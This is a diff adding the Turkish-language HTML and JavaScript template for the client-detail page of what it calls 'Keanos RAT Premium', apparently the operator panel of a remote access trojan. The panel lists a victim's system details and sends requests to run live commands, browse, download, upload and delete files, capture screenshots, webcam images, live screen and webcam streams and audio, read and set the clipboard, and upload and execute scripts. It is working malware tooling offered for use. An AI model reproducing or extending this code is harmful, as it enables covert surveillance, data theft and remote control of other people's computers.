@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>İstemci Detayı - Keanos RAT</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body class="bg-dark text-light">
+    <div class="container py-4">
+        <a href="/" class="btn btn-secondary mb-3">&larr; Geri</a>
+        <h2>İstemci Detayı</h2>
+        <div class="card mb-4">
+            <div class="card-header">Sistem Bilgisi</div>
+            <div class="card-body">
+                <ul class="list-group list-group-flush">
+                    <li class="list-group-item bg-secondary text-light"><b>Bilgisayar Adı:</b> {{ client.sysinfo.hostname }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>Kullanıcı:</b> {{ client.sysinfo.username }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>OS:</b> {{ client.sysinfo.os }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>IP:</b> {{ client.sysinfo.ip }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>MAC:</b> {{ client.sysinfo.mac }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>Konum:</b> {{ client.sysinfo.location }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>Antivirüs:</b> {{ client.sysinfo.antivirus }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>RAM:</b> {{ client.sysinfo.ram }}</li>
+                    <li class="list-group-item bg-secondary text-light"><b>CPU:</b> {{ client.sysinfo.cpu }}</li>
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Komut Geçmişi</div>
+                    <div class="card-body" id="cmd-log">
+                        <ul class="list-group list-group-flush">
+                            {% for log in client.cmd_log %}
+                            <li class="list-group-item bg-dark text-success">{{ log }}</li>
+                            {% endfor %}
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Canlı Komut Gönder</div>
+                    <div class="card-body">
+                        <form id="live-cmd-form">
+                            <input type="hidden" name="client_id" value="{{ client.id }}">
+                            <div class="input-group mb-2">
+                                <input type="text" name="command" class="form-control" placeholder="Komut">
+                                <button class="btn btn-success">Gönder</button>
+                            </div>
+                        </form>
+                        <div id="live-cmd-response" class="mt-2"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-12 mb-3">
+                <div class="card">
+                    <div class="card-header">Dosya Yöneticisi</div>
+                    <div class="card-body">
+                        <form id="listdir-form" class="mb-2">
+                            <div class="input-group">
+                                <input type="text" class="form-control" name="path" id="listdir-path" placeholder="Klasör yolu" value="C:/Users">
+                                <button class="btn btn-primary">Listele</button>
+                            </div>
+                        </form>
+                        <div id="file-list"></div>
+                        <form id="upload-form" class="mt-3" enctype="multipart/form-data">
+                            <div class="input-group">
+                                <input type="file" class="form-control" name="file" id="upload-file">
+                                <input type="text" class="form-control" name="dest" placeholder="Hedef yol (örn: C:/Users/test.txt)">
+                                <button class="btn btn-success">Yükle</button>
+                            </div>
+                        </form>
+                        <div id="upload-result"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Ekran / Webcam</div>
+                    <div class="card-body">
+                        <button class="btn btn-warning mb-2" id="ss-btn">Ekran Görüntüsü Al</button>
+                        <button class="btn btn-danger mb-2" id="webcam-btn">Webcam Aç</button>
+                        <div id="ss-img" class="mt-2"></div>
+                        <div id="webcam-img" class="mt-2"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Ses Kaydı</div>
+                    <div class="card-body">
+                        <form id="audio-form">
+                            <input type="hidden" name="client_id" value="{{ client.id }}">
+                            <div class="input-group mb-2">
+                                <input type="number" name="duration" class="form-control" placeholder="Süre (sn)" value="10" min="1" max="120">
+                                <button class="btn btn-warning">Kaydı Başlat</button>
+                            </div>
+                        </form>
+                        <div id="audio-link"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Canlı Ekran Yayını</div>
+                    <div class="card-body">
+                        <img id="screen-stream-img" class="img-fluid mb-2" style="max-height:320px;"/>
+                        <button class="btn btn-success" onclick="window.screenWs=startStream({{ client.id }}, 'screen')">Başlat</button>
+                        <button class="btn btn-danger" onclick="stopStream(window.screenWs)">Durdur</button>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Canlı Webcam Yayını</div>
+                    <div class="card-body">
+                        <img id="webcam-stream-img" class="img-fluid mb-2" style="max-height:320px;"/>
+                        <button class="btn btn-success" onclick="window.webcamWs=startStream({{ client.id }}, 'webcam')">Başlat</button>
+                        <button class="btn btn-danger" onclick="stopStream(window.webcamWs)">Durdur</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Process Listesi</div>
+                    <div class="card-body">
+                        <button class="btn btn-primary mb-2" onclick="getProcesses()">Listele</button>
+                        <ul id="process-list" class="list-group small"></ul>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6 mb-3">
+                <div class="card">
+                    <div class="card-header">Clipboard Yönetimi</div>
+                    <div class="card-body">
+                        <form id="clipboard-form">
+                            <div class="input-group mb-2">
+                                <input type="text" name="clipboard" id="clipboard-input" class="form-control" placeholder="Clipboard içeriği">
+                                <button class="btn btn-info" type="submit">Ayarla</button>
+                            </div>
+                        </form>
+                        <button class="btn btn-secondary" onclick="getClipboard()">Oku</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-12 mb-3">
+                <div class="card">
+                    <div class="card-header">Script Yükle & Çalıştır</div>
+                    <div class="card-body">
+                        <form id="script-form" enctype="multipart/form-data">
+                            <div class="input-group mb-2">
+                                <input type="file" class="form-control" name="script" id="script-file" accept=".py,.bat,.ps1,.vbs,.sh">
+                                <select name="type" class="form-select" style="max-width:120px;">
+                                    <option value="py">Python</option>
+                                    <option value="bat">Batch</option>
+                                    <option value="ps1">PowerShell</option>
+                                    <option value="vbs">VBScript</option>
+                                    <option value="sh">Shell</option>
+                                </select>
+                                <button class="btn btn-warning">Yükle & Çalıştır</button>
+                            </div>
+                        </form>
+                        <div id="script-result" class="small text-monospace mt-2"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-12 mb-3">
+                <div class="card">
+                    <div class="card-header">Etiket & Blacklist Yönetimi</div>
+                    <div class="card-body">
+                        <form id="tag-form" class="input-group mb-2">
+                            <input type="text" class="form-control" name="tag" id="tag-input" placeholder="Etiket Ekle">
+                            <button class="btn btn-success">Ekle</button>
+                        </form>
+                        <div id="tag-list" class="mb-2"></div>
+                        <form id="blacklist-form" class="input-group">
+                            <input type="text" class="form-control" name="blacklist" id="blacklist-input" placeholder="Blacklist Ekle (örn: IP, kullanıcı, process)">
+                            <button class="btn btn-danger">Ekle</button>
+                        </form>
+                        <div id="blacklist-list" class="mt-2"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer mt-4">Keanos RAT Premium &copy; 2025</div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="/static/stream.js"></script>
+    <script>
+    // AJAX ile canlı komut gönderme
+    $(function(){
+        $('#live-cmd-form').submit(function(e){
+            e.preventDefault();
+            var form = $(this);
+            $.post('/send_command', form.serialize(), function(resp){
+                if(resp.status === 'success'){
+                    $('#live-cmd-response').text('Komut gönderildi!');
+                }else{
+                    $('#live-cmd-response').text('Komut gönderilemedi!');
+                }
+            });
+        });
+        // Dosya listesi
+        $('#listdir-form').submit(function(e){
+            e.preventDefault();
+            var path = $('#listdir-path').val();
+            $.post('/listdir', {client_id: {{ client.id }}, path: path}, function(resp){
+                var html = '<table class="table table-sm table-bordered"><tr><th>Ad</th><th>Tip</th><th>İşlem</th></tr>';
+                if(resp.entries && resp.entries.length > 0){
+                    resp.entries.forEach(function(ent){
+                        html += '<tr><td>'+ent.name+'</td><td>'+ent.type+'</td>'+
+                        '<td>'+
+                        (ent.type=='dir' ? '' : '<button class="btn btn-xs btn-outline-primary" onclick="downloadFile(\''+ent.path+'\')">İndir</button> ')+
+                        '<button class="btn btn-xs btn-outline-danger" onclick="deleteFile(\''+ent.path+'\')">Sil</button>'+
+                        '</td></tr>';
+                    });
+                }else{
+                    html += '<tr><td colspan="3">Bulunamadı</td></tr>';
+                }
+                html += '</table>';
+                $('#file-list').html(html);
+            });
+        });
+        function downloadFile(path){
+            window.open('/download?client_id={{ client.id }}&path='+encodeURIComponent(path), '_blank');
+        }
+        function deleteFile(path){
+            if(confirm('Silmek istediğine emin misin?')){
+                $.post('/delete', {client_id: {{ client.id }}, path: path}, function(resp){
+                    alert(resp.status);
+                    $('#listdir-form').submit();
+                });
+            }
+        }
+        $('#upload-form').submit(function(e){
+            e.preventDefault();
+            var formData = new FormData(this);
+            formData.append('client_id', {{ client.id }});
+            $.ajax({
+                url: '/upload',
+                type: 'POST',
+                data: formData,
+                processData: false,
+                contentType: false,
+                success: function(resp){
+                    $('#upload-result').text(resp.status);
+                    $('#listdir-form').submit();
+                }
+            });
+        });
+        // Dosya listesi
+        $('#file-list-form').submit(function(e){
+            e.preventDefault();
+            var form = $(this);
+            $.post('/file_list', form.serialize(), function(resp){
+                $('#file-list').html(resp.html);
+            });
+        });
+        // Ekran görüntüsü
+        $('#ss-btn').click(function(){
+            $.post('/screenshot', {client_id: {{ client.id }}}, function(resp){
+                if(resp.img){
+                    $('#ss-img').html('<img src="data:image/png;base64,'+resp.img+'" class="img-fluid">');
+                }
+            });
+        });
+        // Webcam
+        $('#webcam-btn').click(function(){
+            $.post('/webcam', {client_id: {{ client.id }}}, function(resp){
+                if(resp.img){
+                    $('#webcam-img').html('<img src="data:image/png;base64,'+resp.img+'" class="img-fluid">');
+                }
+            });
+        });
+        // Ses kaydı
+        $('#audio-form').submit(function(e){
+            e.preventDefault();
+            var form = $(this);
+            $.post('/audio_record', form.serialize(), function(resp){
+                if(resp.url){
+                    $('#audio-link').html('<a href="'+resp.url+'" target="_blank">İndir / Dinle</a>');
+                }else{
+                    $('#audio-link').text('Kayıt başarısız!');
+                }
+            });
+        });
+        function getProcesses() {
+            $.post('/processes', {client_id: {{ client.id }}}, function(resp){
+                var ul = $('#process-list');
+                ul.empty();
+                if(resp.processes && resp.processes.length > 0){
+                    resp.processes.forEach(function(proc){
+                        ul.append('<li class="list-group-item">'+proc+'</li>');
+                    });
+                }else{
+                    ul.append('<li class="list-group-item">Bulunamadı</li>');
+                }
+            });
+        }
+        function getClipboard() {
+            $.post('/get_clipboard', {client_id: {{ client.id }}}, function(resp){
+                $('#clipboard-input').val(resp.clipboard || '');
+            });
+        }
+        $('#clipboard-form').submit(function(e){
+            e.preventDefault();
+            var val = $('#clipboard-input').val();
+            $.post('/set_clipboard', {client_id: {{ client.id }}, clipboard: val}, function(resp){
+                alert(resp.status);
+            });
+        });
+        $('#script-form').submit(function(e){
+            e.preventDefault();
+            var formData = new FormData(this);
+            formData.append('client_id', {{ client.id }});
+            $.ajax({
+                url: '/run_script',
+                type: 'POST',
+                data: formData,
+                processData: false,
+                contentType: false,
+                success: function(resp){
+                    $('#script-result').text(resp.result || resp.error || 'Hata!');
+                }
+            });
+        });
+        function refreshTags() {
+            $.get('/get_tags', {client_id: {{ client.id }}}, function(resp){
+                $('#tag-list').html('Etiketler: '+(resp.tags||[]).join(', '));
+            });
+        }
+        function refreshBlacklist() {
+            $.get('/get_blacklist', {client_id: {{ client.id }}}, function(resp){
+                $('#blacklist-list').html('Blacklist: '+(resp.items||[]).join(', '));
+            });
+        }
+        $('#tag-form').submit(function(e){
+            e.preventDefault();
+            $.post('/add_tag', {client_id: {{ client.id }}, tag: $('#tag-input').val()}, function(){
+                refreshTags();
+                $('#tag-input').val('');
+            });
+        });
+        $('#blacklist-form').submit(function(e){
+            e.preventDefault();
+            $.post('/add_blacklist', {client_id: {{ client.id }}, item: $('#blacklist-input').val()}, function(){
+                refreshBlacklist();
+                $('#blacklist-input').val('');
+            });
+        });
+        refreshTags();
+        refreshBlacklist();
+    });
+    </script>
+</body>
+</html>
